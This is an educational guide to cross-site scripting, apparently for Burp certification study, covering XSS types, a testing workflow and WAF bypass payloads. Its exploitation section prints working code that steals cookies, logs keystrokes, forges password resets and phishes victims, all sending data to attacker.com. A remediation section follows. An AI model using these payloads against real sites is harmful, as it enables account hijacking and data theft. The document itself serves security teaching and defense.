Cross-Site Scripting (XSS)

Inject malicious JavaScript into web pages to steal cookies, hijack sessions, or redirect users.

High BSCP Exam Topic Difficulty: Beginner-Intermediate

Real-World Analogy

Community Notice Board

Imagine a community notice board where anyone can post messages. A malicious person posts a note that looks normal, but includes a hidden instruction: "When you read this, send me your house keys." Everyone who reads the note subconsciously follows the instruction and mails their keys. XSS works the same way: an attacker posts JavaScript into a web page. Visitors' browsers execute the script, unwittingly stealing their session cookies or signing them up for scams.

How It Works

XSS occurs when an application includes untrusted user input in a response without proper encoding or sanitization. The browser interprets the input as code, not text, and executes it with the victim's privileges.

The Three Types of XSS

  • Reflected: Attacker-controlled input is immediately reflected in the response (URL parameter, search term)
  • Stored: Malicious input is saved to the database and executed for every user who views it (comments, profile bios, posts)
  • DOM-based: Vulnerable JavaScript code processes user input unsafely, modifying the DOM and executing scripts

Example · Vulnerable Code

// Reflected XSS  · PHP
<?php
  $name = $_GET['name'];
  echo "Welcome, " . $name . "!";
?>

If you visit ?name=<script>alert(1)</script>, the page renders:

Welcome, <script>alert(1)</script>!

The browser executes the script. The attacker crafts a phishing email: "Click here to see your account" → link is http://site.com/?name=<script>stealCookie()</script>.

Why It's Dangerous

  • Steal session cookies and hijack user accounts
  • Perform actions on behalf of the victim (transfer funds, change passwords, post content)
  • Install malware or redirect to phishing sites
  • Deface the website for all users
  • Capture keystrokes or form data
  • Spread malicious content or worms across social networks

Where to Look

XSS hides in any place where user input is displayed back to users. Test all input fields and URL parameters:

Common Injection Points

  • Search Boxes: Product search, user search, content filtering
  • Comments & Reviews: Comment sections, product reviews, forum posts
  • Profile Fields: Username, bio, profile picture URL, about me
  • Form Fields: Contact forms, feedback, bug reports
  • URL Parameters: ?search=, ?message=, ?redirect=, ?email=
  • Email & Messages: Stored in user inboxes, rendered in email clients or web interfaces

Vulnerable JavaScript Sinks (DOM-based)

Look at the page source for dangerous patterns that process user input:

  • document.getElementById('x').innerHTML = userInput · Direct DOM assignment
  • document.location = userInput · Redirect with user input
  • eval(userInput) · Execute user input as code
  • setTimeout(userInput, 1000) · Scheduled execution
  • window.postMessage(userInput) · Cross-frame messaging with untrusted data
  • document.write(userInput) · Write directly to DOM

How User Input Reaches These Sinks

  • document.location.hash · #fragment in the URL
  • document.URL · Full page URL including query string
  • window.name · Window name property
  • document.referrer · HTTP Referer header
  • localStorage / sessionStorage · Client-side storage

Burp Suite Workflow

1
Identify Input Points

Use Burp Proxy to browse the application and identify where user input is displayed. Look for search boxes, comment sections, error messages, and profile pages. Make a note of each parameter.

2
Test Reflected XSS

In Burp Repeater, inject a simple payload: <script>alert(1)</script> into a GET parameter. Check the response · is your payload visible in the HTML? Does it appear in a <script> tag, in an HTML attribute, or in plain text?

3
Identify Context

The context (where your payload appears) determines the attack vector. Is it inside an HTML tag attribute? Inside a JavaScript string? In a URL? This affects which payload syntax works.

4
Craft Context-Specific Payload

If the payload appears inside a double-quoted attribute, use: " onmouseover="alert(1). If inside a script tag, use: </script><script>alert(1)</script>. Test encoding variations if blocked.

5
Test Stored XSS

Inject payloads into fields that are saved to the database (comments, profile bio). Submit the form. Log out and log back in. Does the payload execute? Check if other users see the payload.

6
Detect DOM-based XSS with DOM Invader

Use Burp's DOM Invader (available in Burp Community). It automatically identifies sources and sinks in JavaScript. Test payloads like test'><img src=x onerror=alert(1)> to trigger DOM XSS.

Payloads & Techniques

HTML Body Context

Your payload appears in plain HTML. Use standard script tags:

<script>alert(document.cookie)</script>
<script>alert('XSS')</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>

HTML Attribute Context (Double-Quoted)

Your payload appears inside an attribute, e.g., <img title="USER_INPUT">:

" onmouseover="alert(1)
" onclick="alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script><img src="

HTML Attribute Context (Single-Quoted)

Same idea, but with single quotes:

' onmouseover='alert(1)
' onclick='alert(1)
'><img src='x' onerror='alert(1)>

JavaScript String Context

Your payload appears inside a JavaScript string, e.g., <script>var name = "USER_INPUT"</script>:

";alert(1);//
";alert(String.fromCharCode(88,83,83));//
\";alert(1);//
' + alert(1) + '

JavaScript URL Context (href, src)

Attribute contains a URL that executes JavaScript:

javascript:alert(1)

javascript:void(fetch('http://attacker.com/?c='+document.cookie))

WAF Bypass Techniques

Case Mixing

WAFs checking for exact strings miss case variations:

<sCrIpT>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
<Svg OnLoad=alert(1)>

Null Bytes & Special Characters

<script%00>alert(1)</script>
<scr%00ipt>alert(1)</script>
<scri�pt>alert(1)</script>

HTML Encoding in Attributes

Use HTML entities for attribute values:

<img src=x onerror="alert(1)">
<img src=x onerror="alert(1)">
<img src=x onerror=""alert(1)"">

Spaces and Newlines

<img src=x onerror=alert(1)>       (no quotes)
<img  src=x  onerror=alert(1)>     (multiple spaces)
<img
src=x
onerror=alert(1)>                    (newlines)

JavaScript URL Encoding

javascript:alert(String.fromCharCode(88,83,83))   (XSS in character codes)
javascript:eval(atob('YWxlcnQoMSk='))             (Base64 decode)

Breaking Out with Uncommon Tags

WAFs often whitelist common tags but miss others:

<details open ontoggle=alert(1)>

<marquee onstart=alert(1)>
<keygen onfocus=alert(1)>

Event Handler Tricks

Bypass filters checking for common events:

<img src=x onerror=alert(1)>           (a = 'a')

<svg onload="eval(name)">                      (uses window.name)

Data URLs

Exploitation & Impact

Session Hijacking Flow

Basic attack to steal a user's session cookie:

// Step 1: Set up attacker server to receive cookies
// http://attacker.com/log_cookie.php
<?php file_put_contents('cookies.txt', $_GET['c'] . "\n", FILE_APPEND); ?>

// Step 2: Craft XSS payload
<script>
  fetch('http://attacker.com/log_cookie.php?c=' + encodeURIComponent(document.cookie));
</script>

// Step 3: Deliver payload via URL or stored XSS
// Phishing email: "Click here to verify your account: http://target.com/?msg=<script>fetch('http://attacker.com/log_cookie.php?c='+document.cookie)</script>"

// Step 4: Use stolen cookie
// Copy-paste the cookie into a browser's dev tools (Application > Cookies) or use curl:
// curl -H "Cookie: PHPSESSID=abcd1234..." http://target.com/account

Account Takeover via Password Reset

// Hijack the password reset form
<script>
  fetch('http://target.com/api/reset-password', {
    method: 'POST',
    body: JSON.stringify({
      email: 'victim@example.com',
      new_password: 'attacker_controlled_password'
    })
  });
</script>

Keylogging

<script>
  document.addEventListener('keydown', (e) => {
    fetch('http://attacker.com/log?key=' + e.key);
  });
</script>

Redirection to Phishing Site

<script>
  window.location = 'http://attacker.com/fake-login.html';
</script>

Real-World Exploitation Scenarios

Scenario 1: Stored XSS in Blog Comments

Attacker posts a comment with JavaScript. Every time a user visits the blog, the script executes and steals their session cookie. The attacker now has access to thousands of user accounts.

Scenario 2: Reflected XSS in Search

Attacker crafts a malicious link: site.com/?search=<script>alert(1)</script>. Sends it in a phishing email. When a victim clicks, their cookie is stolen.

Scenario 3: DOM-based XSS via URL Fragment

A single-page application processes the URL fragment unsafely. Attacker sends: site.com/#user=<img src=x onerror=steal_cookie()>. The JavaScript code renders the fragment without sanitizing, triggering the XSS.

Scenario 4: Worm Propagation on Social Media

Attacker injects JavaScript into a post/comment that automatically likes/shares the same payload. It spreads exponentially across the social network, infecting thousands of users.

Scenario 5: Supply Chain Attack via XSS in Admin Panel

Admin panel has stored XSS in error logs. Attacker logs in with stolen credentials, posts JavaScript in error messages. When admins view logs, their session is hijacked and data is exfiltrated.

Remediation

Output Encoding (Context-Specific)

Encode user output based on where it appears. Different contexts require different encoding:

HTML Body Context (Encode <, >, &, ", ')

// Python (Flask)
from markupsafe import escape
@app.route('/')
def index():
    user_input = request.args.get('name', '')
    return f"Welcome, {escape(user_input)}!"

// HTML entities: <, >, &, ", '

HTML Attribute Context (Encode all non-alphanumeric)

// PHP
$safe_input = htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8');
echo "<img title='{$safe_input}'>";

JavaScript String Context (Escape Quotes & Backslashes)

// JavaScript
function escapeJsString(str) {
  return str.replace(/\\/g, '\\\\')
            .replace(/"/g, '\\"')
            .replace(/'/g, "\\'")
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r');
}

var userInput = escapeJsString(userInput);
var script = "var name = '" + userInput + "';";
document.body.appendChild(document.createElement('script')).text = script;

URL Attribute Context (URL Encode)

// Python
from urllib.parse import quote
safe_url = quote(user_input, safe='')
html = f'<a href="{safe_url}">Link</a>'

Content Security Policy (CSP)

Enforce a strict policy limiting which resources can execute:

// Strict policy  · no inline scripts, only from same origin
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';

// Allow only specific domains
Content-Security-Policy: script-src 'self' https://cdn.example.com;

// Report violations without blocking (for testing)
Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-report

DOM Sanitization Libraries

For client-side rendering, use libraries that remove dangerous content:

// JavaScript (DOMPurify)
<script src="https://cdn.jsdelivr.net/npm/dompurify@latest/dist/purify.min.js"></script>
<script>
  var dirty = '<img src=x onerror=alert(1)>';
  var clean = DOMPurify.sanitize(dirty);
  document.body.innerHTML = clean;  // Safe
</script>

// Python (bleach)
import bleach
dirty_html = '<script>alert(1)</script><p>Hello</p>'
clean_html = bleach.clean(dirty_html, tags=['p'], strip=True)

Avoid Dangerous APIs

Never use these in client-side code with user input:

// NEVER do this:
document.getElementById('x').innerHTML = userInput;   // VULNERABLE
eval(userInput);                                        // VULNERABLE
setTimeout(userInput, 1000);                            // VULNERABLE
document.location = userInput;                          // VULNERABLE

// Use these instead:
document.getElementById('x').textContent = userInput;   // SAFE (no HTML parsing)
document.getElementById('x').appendChild(
  document.createTextNode(userInput)
);                                                      // SAFE

HTTP Security Headers

// Prevent clickjacking
X-Frame-Options: DENY

// Prevent MIME sniffing
X-Content-Type-Options: nosniff

// Enable XSS filter in older browsers
X-XSS-Protection: 1; mode=block

Security Testing

  • Include XSS testing in your CI/CD with automated tools (Burp Scanner, OWASP ZAP)
  • Use Static Application Security Testing (SAST) tools to find dangerous patterns (unsanitized echo, innerHTML assignment)
  • Perform code reviews focusing on input/output handling

Common Beginner Mistakes

Mistake #1: Only Testing <script> Tags

Many testers only try <script>alert(1)</script> and give up. Other attack vectors exist: img tags with onerror, SVG with onload, event attributes in existing HTML. Always test multiple payloads.

Mistake #2: Forgetting Stored XSS

Beginners focus on reflected XSS (in URLs) and miss stored XSS (in databases). Test comment fields, profile bios, review sections. Submit a payload, log out, log back in · does it still execute?

Mistake #3: Not Testing DOM-based XSS

Look at the page source. If you see document.location = something or innerHTML = something processing user input, test for DOM XSS. Use URL fragments (#), not query strings, to test. The payload might not appear in the HTTP response but still execute in JavaScript.

Mistake #4: Not Adapting Payload to Context

If your payload appears inside a quoted attribute, <script> won't execute. You need: " onmouseover="alert(1). Look at where your test input appears in the response, then craft the appropriate payload.

Mistake #5: Assuming HTML Encoding is Sanitization

If the server sends back &lt;script&gt;, it's still rendered as <script> in HTML. This is often safe, but check the actual browser rendering. Some encoding is insufficient for all contexts.

Mistake #6: Testing Only GET Parameters

POST data, JSON bodies, headers, and cookies are vulnerable too. Use Burp Repeater to test every input channel, not just URL parameters.

Mistake #7: Using alert(1) Without Understanding What Broke It

If alert() doesn't work, try console.log(), check browser console errors, or use a different event. Sometimes alert() is blocked but other JavaScript functions run fine. Test a series of payloads, not just one.

Mistake #8: Forgetting javascript: Protocol in href

Links with href="javascript:alert(1)" execute XSS. Also test data URLs: href="data:text/html,<script>alert(1)</script>".
